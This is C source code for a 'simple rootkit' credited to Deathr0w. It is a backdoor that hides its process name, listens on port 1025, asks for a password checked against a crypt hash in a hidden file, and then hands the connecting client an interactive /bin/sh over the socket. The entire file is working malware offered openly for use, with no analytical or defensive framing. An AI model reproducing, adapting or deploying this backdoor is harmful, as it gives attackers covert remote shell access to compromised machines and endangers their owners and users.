/*  simple rootkit by Deathr0w - deathr0w.speckz.com
    based on blackhole.c by Bronc Buster  */

#define _XOPEN_SOURCE
#include <pwd.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/socket.h>

#define PASSFILE "./.rkpass"

int rootkit(int);
int checkpass(int);

int main(int argc, char *argv[])
{
  /* user defined settings - change them */
  const short int port = 1025;
  const char * ps_listing = "rkit by Deathr0w@attrition.org";


  const int backlog = 3;
  int listenfd, connfd, len, status;
  struct sockaddr_in servaddr, cliaddr;


  /* changing the ps listing */
  strcpy(argv[0], ps_listing);

  listenfd = socket(AF_INET, SOCK_STREAM, 0);

  bzero(&servaddr, sizeof(servaddr));
  servaddr.sin_family = AF_INET;
  servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
  servaddr.sin_port = htons(port);

  bind(listenfd, (struct sockaddr *) &servaddr, sizeof(servaddr));

  listen(listenfd, backlog);

  for( ; ; ) {   /* connection acceptance loop */  
    len = sizeof(cliaddr);
    connfd = accept(listenfd, (struct sockaddr *) &cliaddr, &len);
    printf("connection accepted from: %s:%d\n",
            inet_ntoa(cliaddr.sin_addr.s_addr), ntohs(cliaddr.sin_port));

    if( fork() != 0)
      if( (status = rootkit(connfd)) < 0) {
        close(connfd);
        if(status == -1)
          printf("error: password guesses exhausted by: %s\n", inet_ntoa(cliaddr.sin_addr.s_addr));
        else
          printf("rootkit() failed!\n");
      }

    close(connfd);
  }
}


int rootkit(int connfd)
{
  const char * shell = "/bin/sh";
  char welcome[] = "\nrkit by Deathr0w\ndeathr0w.speckz.com\n\n";
  char badpass[] = "Incorrect Password\n";
  char disconn[] = "Exhausted Allowed Guesses. Bye.\n";
  char success[] = "Succesfully Logged In.\n";
  unsigned int guess = 0;

  send(connfd, welcome, sizeof(welcome), 0);


  while( checkpass(connfd) < 0) {
    send(connfd, badpass, sizeof(badpass), 0);
    ++guess;

    if(guess >= 3) {
      send(connfd, disconn, sizeof(disconn), 0);
      close(connfd);
      return -1;
    }
  }

  send(connfd, success, sizeof(success), 0);
  
  dup2(connfd, 0);
  dup2(connfd, 1);
  dup2(connfd, 2);

  execl(shell, shell, (char *) 0);
  close(connfd);
  exit(0);
}


int checkpass(int connfd)
{
  int filefd = 0, i = 0;
  char pprompt[] = "Password (1-8 characters): ";
  char userpass[14] = "\0";   /* password the client user enters */
  char realpass[14] = "\0";   /* password stored in PASSFILE */
  char salt[3] = "\0";

  send(connfd, pprompt, sizeof(pprompt), 0);  
  recv(connfd, userpass, sizeof(userpass), 0);

  /* ridding ourselves of all stray characters in the password */
  for(i = (strlen(userpass) - 2); i < sizeof(userpass); i++)
    userpass[i] = '\0';

  filefd = open(PASSFILE, O_RDONLY);
  read(filefd, realpass, sizeof(realpass));

  /* retrieving salt string */
  salt[0] = realpass[0];
  salt[1] = realpass[1];
  salt[2] = '\0';

  strncpy(userpass, (char *) crypt(userpass, salt), sizeof(userpass));

  if( strcmp(userpass, realpass) == 0)
    return 1;
  else
    return -1;
}
